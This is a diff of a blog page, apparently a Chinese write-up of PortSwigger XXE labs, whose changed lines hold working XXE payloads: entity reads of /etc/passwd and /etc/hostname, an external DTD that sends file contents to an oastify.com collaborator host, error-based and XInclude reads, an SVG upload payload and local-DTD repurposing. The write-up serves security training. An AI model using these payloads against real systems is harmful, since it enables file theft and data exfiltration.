@@ -68,10 +68,6 @@
   
 
   
-    
-<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
-
-  
 
   <link
   rel="stylesheet"
@@ -79,7 +75,8 @@
   media="all"
 />
 
-</head><body>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body>
 
 
 
@@ -132,7 +129,7 @@
 <p>检查库存功能用 burp 截断数据包，然后松手在 HTTP History 中查看请求，转到 Repeater。</p>
 <p>往下看，当看到 XML 的时候，应该考虑 XXE 注入。接下来就是找到注入点，具体位置有两个，一个是 productId，另一个是 storeId。</p>
 <p>在 XML 声明和元素 stockCheck 之间插入外部实体定义。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE <span class="hljs-built_in">test</span> [ &lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt; ]&gt;<br><br><span class="hljs-comment"># 定义了一个名为 xxe 的实体，它指向文件系统中的 /etc/passwd 文件。</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE <span class="built_in">test</span> [ &lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt; ]&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义了一个名为 xxe 的实体，它指向文件系统中的 /etc/passwd 文件。</span></span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%20(XXE)%20%E6%B3%A8%E5%85%A5/202410062047045.png" alt="230221PM04_2"></p>
 <h2 id="2-Exploiting-XXE-to-perform-SSRF-attacks">2. Exploiting XXE to perform SSRF attacks</h2>
 <blockquote>
@@ -153,7 +150,7 @@
 </blockquote>
 <p>访问产品页面，单击“检查库存”并在 Burp 中拦截请求。</p>
 <p>定义外部实体，插入 Burp 的协作子域名。转到“子域名”选项卡，然后单击“Poll now”。 可以看到 DNS 和 HTTP 交互。它的作用是，确认我们可以让应用程序与攻击者控制的对话服务器，为带外渗透做好准备</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &quot;http://1hj71n3ymgjdmmtrt6ye3mqcf3lt9i.oastify.com&quot;&gt; ]&gt;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &quot;http://1hj71n3ymgjdmmtrt6ye3mqcf3lt9i.oastify.com&quot;&gt; ]&gt;</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%20(XXE)%20%E6%B3%A8%E5%85%A5/202410062048351.png" alt="230222AM10_11"></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%20(XXE)%20%E6%B3%A8%E5%85%A5/202410062048724.png" alt="230222AM10_12"></p>
 <h2 id="4-Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities">4. Blind XXE with out-of-band interaction via XML parameter entities</h2>
@@ -161,7 +158,7 @@
 <p>通过 XML 参数实体进行带外交互的盲 XXE</p>
 </blockquote>
 <p>外带交互的盲 XXE 是通过利用 XML 解析器向==外部服务器（burp 子域）==发送数据，使得攻击者可以==通过外部服务器与目标系统进行交互==。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM <span class="hljs-string">&quot;http://1hj71n3ymgjdmmtrt6ye3mqcf3lt9i.oastify.com&quot;</span>&gt; %xxe; ]&gt;<br><br><span class="hljs-comment"># 定义了一个名为 xxe 的参数实体，它指向一个远程 URL http://……</span><br><span class="hljs-comment"># 使用了 % 操作符来引用实体，%xxe --&gt; 表示引用实体xxe</span><br><span class="hljs-comment"># XML 文档被解析时，实体引用（%xxe; ）将会被展开并替换为实体声明中的值（也就是远程 URL），而可能导致系统被攻击者控制的服务器接管。</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM <span class="string">&quot;http://1hj71n3ymgjdmmtrt6ye3mqcf3lt9i.oastify.com&quot;</span>&gt; %xxe; ]&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义了一个名为 xxe 的参数实体，它指向一个远程 URL http://……</span></span><br><span class="line"><span class="comment"># 使用了 % 操作符来引用实体，%xxe --&gt; 表示引用实体xxe</span></span><br><span class="line"><span class="comment"># XML 文档被解析时，实体引用（%xxe; ）将会被展开并替换为实体声明中的值（也就是远程 URL），而可能导致系统被攻击者控制的服务器接管。</span></span><br></pre></td></tr></table></figure>
 <blockquote>
 <p><strong>Quote / 参考</strong></p>
 <p>盲XXE（Blind XXE），它可以在没有直接访问应用程序响应的情况下，仍能从应用程序中获取敏感信息。</p>
@@ -171,10 +168,10 @@
 <blockquote>
 <p>利用盲 XXE 使用恶意外部 DTD 泄露数据</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!ENTITY % file SYSTEM <span class="hljs-string">&quot;file:///etc/hostname&quot;</span>&gt;<br>&lt;!ENTITY % <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://0abk7wm21os9liaqg27kek4ic9iz6o.oastify.com/?x=%file;&#x27;&gt;&quot;</span>&gt;<br>%<span class="hljs-built_in">eval</span>;<br>%exfil;<br><br><span class="hljs-comment"># 定义了一个名为 file 的外部实体，它包含了 /etc/hostname 文件的内容。可以利用此实体来访问并泄露目标系统中的文件内容</span><br><br><span class="hljs-comment"># 这一行定义了一个名为 eval 的外部实体，它包含了一个实体声明 exfil，该实体可将 file 实体的内容发送到攻击者控制的服务器。exfil实体的定义包括一个URL，该URL包含攻击者控制的服务器地址和将file实体的内容作为查询参数的字符串。在这种情况下，exfil实体将文件内容发送到http://0abk7wm21os9liaqg27kek4ic9iz6o.oastify.com/，并将file实体的内容作为查询参数x的值。</span><br><br><span class="hljs-comment"># %eval; %exfil; 这两行将eval实体和exfil实体插入到XML文档中。攻击者可以将这些实体插入到一个合法的XML文档中，并发送给目标系统进行解析。在解析XML文档时，目标系统将解析eval实体，然后解析exfil实体，从而触发将file实体的内容发送到攻击者控制的服务器的行为。</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;file:///etc/hostname&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % <span class="built_in">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://0abk7wm21os9liaqg27kek4ic9iz6o.oastify.com/?x=%file;&#x27;&gt;&quot;</span>&gt;</span><br><span class="line">%<span class="built_in">eval</span>;</span><br><span class="line">%exfil;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义了一个名为 file 的外部实体，它包含了 /etc/hostname 文件的内容。可以利用此实体来访问并泄露目标系统中的文件内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这一行定义了一个名为 eval 的外部实体，它包含了一个实体声明 exfil，该实体可将 file 实体的内容发送到攻击者控制的服务器。exfil实体的定义包括一个URL，该URL包含攻击者控制的服务器地址和将file实体的内容作为查询参数的字符串。在这种情况下，exfil实体将文件内容发送到http://0abk7wm21os9liaqg27kek4ic9iz6o.oastify.com/，并将file实体的内容作为查询参数x的值。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># %eval; %exfil; 这两行将eval实体和exfil实体插入到XML文档中。攻击者可以将这些实体插入到一个合法的XML文档中，并发送给目标系统进行解析。在解析XML文档时，目标系统将解析eval实体，然后解析exfil实体，从而触发将file实体的内容发送到攻击者控制的服务器的行为。</span></span><br></pre></td></tr></table></figure>
 <p>将 DTD 文件保存在服务器上，单击“查看漏洞”并记下 URL；用 burp 截断检查库存的请求，定义外部实体</p>
 <p>最后返回 Burp Collaborator client，会看到一些 DNS 和 HTTP 交互，特别关注 HTTP 交互，可能包含文件的内容。<code>/etc/hostname</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM <span class="hljs-string">&quot;https://exploit-0a57006c0302b2d5c0e221d8013c0082.exploit-server.net/exploit&quot;</span>&gt; %xxe;]&gt;<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM <span class="string">&quot;https://exploit-0a57006c0302b2d5c0e221d8013c0082.exploit-server.net/exploit&quot;</span>&gt; %xxe;]&gt;</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%20(XXE)%20%E6%B3%A8%E5%85%A5/202410062048966.png" alt="230222PM12_17"></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%20(XXE)%20%E6%B3%A8%E5%85%A5/202410062048972.png" alt="230222PM12_16"></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%20(XXE)%20%E6%B3%A8%E5%85%A5/202410062048712.png" alt="230222PM12_15"></p>
@@ -182,16 +179,16 @@
 <blockquote>
 <p>利用盲 XXE 通过错误消息检索数据</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!ENTITY % file SYSTEM <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;<br>&lt;!ENTITY % <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;file:///invalid/%file;&#x27;&gt;&quot;</span>&gt;<br>%<span class="hljs-built_in">eval</span>;<br>%exfil;<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % <span class="built_in">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;file:///invalid/%file;&#x27;&gt;&quot;</span>&gt;</span><br><span class="line">%<span class="built_in">eval</span>;</span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure>
 <p>将 DTD 文件保存在服务器上，单击“查看漏洞”并记下 URL；用 burp 截断检查库存的请求，定义外部实体，会看到一条包含文件内容错误消息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM <span class="hljs-string">&quot;https://exploit-0a42007304c1c092c003856801a900e4.exploit-server.net/exploit&quot;</span>&gt; %xxe;]&gt;<br><br><span class="hljs-comment"># 定义了一个名为 foo 的 DTD 声明，其中包含了一个名为 xxe的 外部实体。</span><br><span class="hljs-comment"># xxe 实体的定义包括一个 URL，该 URL 指向服务器上的一个文件，文件包含敏感信息。在这种情况下，可以将获取的信息发送到 https……</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM <span class="string">&quot;https://exploit-0a42007304c1c092c003856801a900e4.exploit-server.net/exploit&quot;</span>&gt; %xxe;]&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义了一个名为 foo 的 DTD 声明，其中包含了一个名为 xxe的 外部实体。</span></span><br><span class="line"><span class="comment"># xxe 实体的定义包括一个 URL，该 URL 指向服务器上的一个文件，文件包含敏感信息。在这种情况下，可以将获取的信息发送到 https……</span></span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%20(XXE)%20%E6%B3%A8%E5%85%A5/202410062048145.png" alt="230222PM02_18"></p>
 <h2 id="7-Exploiting-XInclude-to-retrieve-files">7. Exploiting XInclude to retrieve files</h2>
 <blockquote>
 <p>利用 XInclude 检索文件</p>
 </blockquote>
 <p>抓包检查库存功能，修改 productId 的值</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;foo xmlns:xi=<span class="hljs-string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;&lt;xi:include parse=<span class="hljs-string">&quot;text&quot;</span> href=<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>/&gt;&lt;/foo&gt;<br><br><span class="hljs-comment"># 这个XML文档定义了一个名为foo的元素，并且通过XML命名空间定义了一个名为xi的前缀，它的命名空间是&quot;http://www.w3.org/2001/XInclude&quot;。然后，它使用了`xi:include`元素来指定要包含的内容，包括`parse`和`href`属性。</span><br><br><span class="hljs-comment"># parse属性指定了包含的文件是以文本方式解析的，而不是XML方式解析。href属性指定了要包含的文件的路径，这里是file:///etc/passwd，也就是本地系统上的/etc/passwd文件。由于该文件包含有关用户帐户的信息，因此攻击者可以使用这种技术来收集系统信息并进行其他攻击。</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;foo xmlns:xi=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;&lt;xi:include parse=<span class="string">&quot;text&quot;</span> href=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;&lt;/foo&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个XML文档定义了一个名为foo的元素，并且通过XML命名空间定义了一个名为xi的前缀，它的命名空间是&quot;http://www.w3.org/2001/XInclude&quot;。然后，它使用了`xi:include`元素来指定要包含的内容，包括`parse`和`href`属性。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># parse属性指定了包含的文件是以文本方式解析的，而不是XML方式解析。href属性指定了要包含的文件的路径，这里是file:///etc/passwd，也就是本地系统上的/etc/passwd文件。由于该文件包含有关用户帐户的信息，因此攻击者可以使用这种技术来收集系统信息并进行其他攻击。</span></span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%20(XXE)%20%E6%B3%A8%E5%85%A5/202410062051903.png" alt="230222PM03_19"></p>
 <h2 id="8-Exploiting-XXE-via-image-file-upload">8. Exploiting XXE via image file upload</h2>
 <blockquote>
@@ -202,7 +199,7 @@
 <p><strong>Expand / 拓展</strong></p>
 <p>SVG 文件是由 XML 构成的，因此可以使用 XML 的各种功能来嵌入数据或 payload 到 SVG 图像中。由于 SVG 图像可以包含文本、图形和脚本等元素，因此可以使用这些元素来嵌入payload</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> standalone=<span class="hljs-string">&quot;yes&quot;</span>?&gt;&lt;!DOCTYPE <span class="hljs-built_in">test</span> [ &lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;file:///etc/hostname&quot;</span> &gt; ]&gt;&lt;svg width=<span class="hljs-string">&quot;128px&quot;</span> height=<span class="hljs-string">&quot;128px&quot;</span> xmlns=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> xmlns:xlink=<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span> version=<span class="hljs-string">&quot;1.1&quot;</span>&gt;&lt;text font-size=<span class="hljs-string">&quot;16&quot;</span> x=<span class="hljs-string">&quot;0&quot;</span> y=<span class="hljs-string">&quot;16&quot;</span>&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;<br><br><span class="hljs-comment"># 当SVG文件被处理时，xxe实体会被解析为文件/etc/hostname的内容，然后将该内容作为文本元素的内容插入到SVG图像中，从而显示该文件的内容。</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;&lt;!DOCTYPE <span class="built_in">test</span> [ &lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///etc/hostname&quot;</span> &gt; ]&gt;&lt;svg width=<span class="string">&quot;128px&quot;</span> height=<span class="string">&quot;128px&quot;</span> xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> xmlns:xlink=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> version=<span class="string">&quot;1.1&quot;</span>&gt;&lt;text font-size=<span class="string">&quot;16&quot;</span> x=<span class="string">&quot;0&quot;</span> y=<span class="string">&quot;16&quot;</span>&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当SVG文件被处理时，xxe实体会被解析为文件/etc/hostname的内容，然后将该内容作为文本元素的内容插入到SVG图像中，从而显示该文件的内容。</span></span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%20(XXE)%20%E6%B3%A8%E5%85%A5/202410062048430.png" alt="230222PM05_25"></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%20(XXE)%20%E6%B3%A8%E5%85%A5/202410062048405.png" alt="230222PM04_24"></p>
 <h2 id="9-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD">9. Exploiting XXE to retrieve data by repurposing a local DTD</h2>
@@ -210,7 +207,7 @@
 <p>利用 XXE 通过重新调整本地 DTD 的用途来检索数据</p>
 </blockquote>
 <p>抓包检查库存功能</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE message [<br>&lt;!ENTITY % local_dtd SYSTEM <span class="hljs-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;<br>&lt;!ENTITY % ISOamso <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="hljs-string">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="hljs-string">&amp;#x25;eval;</span><br><span class="hljs-string">&amp;#x25;error;</span><br><span class="hljs-string">&#x27;</span>&gt;<br>%local_dtd;<br>]&gt;<br><br><span class="hljs-comment"># 定义名为“file”的实体，并将其设置为/etc/passwd文件的路径，然后通过将这个实体插入到另一个名为“eval”的实体中，最终触发了漏洞，导致可以读取系统上的/etc/passwd文件的内容。同时，攻击者也定义了一个名为“error”的实体，用于报告错误信息。</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % ISOamso <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span><br><span class="line"><span class="string">&amp;#x25;eval;</span></span><br><span class="line"><span class="string">&amp;#x25;error;</span></span><br><span class="line"><span class="string">&#x27;</span>&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义名为“file”的实体，并将其设置为/etc/passwd文件的路径，然后通过将这个实体插入到另一个名为“eval”的实体中，最终触发了漏洞，导致可以读取系统上的/etc/passwd文件的内容。同时，攻击者也定义了一个名为“error”的实体，用于报告错误信息。</span></span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%20(XXE)%20%E6%B3%A8%E5%85%A5/202410062048267.png" alt="230222PM05_26"></p>
 
 <div class="article-footer fs14"></div>
@@ -707,28 +704,16 @@
     }
   });
 </script>
-<script>
-  document.addEventListener('DOMContentLoaded', function () {
-    window.codeElements = document.querySelectorAll('.code');
-    if (window.codeElements.length > 0) {
-      ctx.copycode = {
-        default_text: `Copy`,
-        success_text: `Copied`,
-        toast: ``,
-      };
-      utils.js('/js/plugins/copycode.js');
-    }
-  });
-</script>
+
 
 
                   <!-- inject -->
                   
 
-                    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
